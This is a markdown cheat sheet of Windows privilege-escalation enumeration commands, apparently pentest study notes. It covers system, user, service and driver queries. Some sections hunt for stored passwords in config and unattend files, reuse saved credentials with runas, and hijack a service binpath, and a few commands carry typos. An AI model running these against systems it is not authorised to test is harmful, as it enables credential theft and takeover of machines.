# Windows EoP

## System
```bash
hostname
systeminfo

#Get more precise information
systeminfo | findstr /b /i /c:"os version" /c:"os name" /c:"system type"

#logical disk
wmic logicaldisk get Caption ,description ,providername
```
## Network
```bash
#network interface
ipconfig /all

#network service and established connection
netstat -ano

#route table
route print 

#arp table
arp -a
```
## User
```bash
whoami /all
net users
net localgroup
net user <username>
net localgroup <groupname>
```
## Anti-virus 
```bash
#windows defender
sc query windefend
```
## Password hunting
```bash
#This command could take lots of time.
findstr /pisn /c:"password" /c:"passwd" *.ini *.txt *.conf *.config *.php *.xml
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
dir /s *pass* == *cred* == *vnc* == *.config*

#Looking for credentials that was stored in cmdkey,and login with the save credential
cmdkey /list
c:windows\system32\runas.exe /user:<username> /savecred <command>

```

## Process
```bash
tasklist /svc
```

## Service and scheduled task
```bash
#Scheduled task
schtasks /query /fo list /v

#Using wmic to get service list
wmic service get displayname,pathname
wmic service where Caption="service name" get name,caption,state,startmode

#Using powershell to get service list
Get-WmiObject win32_service | Select-Object Name,State,PathName|?{$_.State -like "Running"}

#service controller
sc queryex type=service
sc qc <service name>

#Checking all service access rights by accesschk.exe(-c means checking services,not files)
accesschk.exe -ucvw "everyone" *

#configure service settings
sc config <service name> binpath= "<command>"

#start service 
sc start <service name>
net start <service name>

#stop service(need administrator permission)
sc stop <service name>
net stop <service name>
```

##Checking registry
```bash
Get-Acl -path <registry path>|fl
```
## Installed application and patch level
```bash
#only list application that was installed by windows installer
wmic product get name ,version ,vendor

#Hot patched
wmic qfe get Caption,Description,HotFixId,InstalledOn
```

## file permission
```bash
icacls.exe <Pathname>
accesschk.exe -accepteula -uws "everyone" "C:\program files"

#If we can't transfer accesschk.exe to client or accesschk.exe doesn't work.
#This powershell command.
Get-ChildItem "C:\program files" -Recurse|Get-Acl|?{$_.AccessToString -match "Everyone\sAllow\s\sMo
dify"}

#Check if we can write at startup directory(less common)
#Current user
icacls.exe C:\<Users>\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
#All users
icacls.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp


```
## Locate files
```bash
where /r c:\ <filename>
#for example,bash.exe and wsl.exe(wsl.exe could be EoP path,too.)
where /r c:\ bash.exe
where /r c:\ wsl.exe
```
## Device and driver
```bash
#Device
mounvol
#Driver
driverquery.exe /v /fo csv|ConvertFrom-Csv|Select-Object 'Display Name' ,'Start Mode','Path'
#Driver
#This is powershell command
Get-WmiObject Win32_PnPSignedDriver|Select-Object DeviceName,DriverVersion,Manufacturer|?{$_.DeviceName -like "*VMware*"}
```

## specail trick
AlwaysInstallElevated
```bash
#if both value are 0x01,then we can craft .msi file to exploit it.
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElvated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElvated

#Display alternate data streams of the file.
dir /r
```

## firewall 
```bash
#check if firewall open
netsh  advfirewall show currentprofile
netsh firewall show state

#check the firewall rule
netsh advfirewall  firewall show rule name=all
netsh firewall show config
```

## automated enumeration
```bash
windows-privesc-check2.exe
```

## reference
https://www.fuzzysecurity.com/tutorials/16.html
